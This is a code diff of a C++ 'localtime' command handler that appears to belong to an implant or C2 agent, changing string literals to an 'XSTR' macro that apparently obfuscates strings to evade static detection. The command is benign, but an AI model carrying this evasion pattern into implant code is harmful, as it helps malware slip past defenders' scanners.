@@ -29,7 +29,7 @@ auto declfn starburst::cmd_localtime(
 
     if ( !pGetLocalTime ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "failed to resolve GetLocalTime" ) ) );
+            XSTR( "failed to resolve GetLocalTime" ) );
         return;
     }
 
@@ -90,18 +90,18 @@ auto declfn starburst::cmd_localtime(
     off += slen;
 
     // day of week
-    str_copy( output + off, symbol<char*>( const_cast<char*>( " (" ) ) );
+    str_copy( output + off, XSTR( " (" ) );
     off += 2;
 
     // wDayOfWeek: 0=Sunday .. 6=Saturday
     switch ( st.wDayOfWeek ) {
-        case 0: str_copy( output + off, symbol<char*>( const_cast<char*>( "Sunday" ) ) );    off += 6; break;
-        case 1: str_copy( output + off, symbol<char*>( const_cast<char*>( "Monday" ) ) );    off += 6; break;
-        case 2: str_copy( output + off, symbol<char*>( const_cast<char*>( "Tuesday" ) ) );   off += 7; break;
-        case 3: str_copy( output + off, symbol<char*>( const_cast<char*>( "Wednesday" ) ) ); off += 9; break;
-        case 4: str_copy( output + off, symbol<char*>( const_cast<char*>( "Thursday" ) ) );  off += 8; break;
-        case 5: str_copy( output + off, symbol<char*>( const_cast<char*>( "Friday" ) ) );    off += 6; break;
-        case 6: str_copy( output + off, symbol<char*>( const_cast<char*>( "Saturday" ) ) );  off += 8; break;
+        case 0: str_copy( output + off, XSTR( "Sunday" ) );    off += 6; break;
+        case 1: str_copy( output + off, XSTR( "Monday" ) );    off += 6; break;
+        case 2: str_copy( output + off, XSTR( "Tuesday" ) );   off += 7; break;
+        case 3: str_copy( output + off, XSTR( "Wednesday" ) ); off += 9; break;
+        case 4: str_copy( output + off, XSTR( "Thursday" ) );  off += 8; break;
+        case 5: str_copy( output + off, XSTR( "Friday" ) );    off += 6; break;
+        case 6: str_copy( output + off, XSTR( "Saturday" ) );  off += 8; break;
         default: break;
     }
 
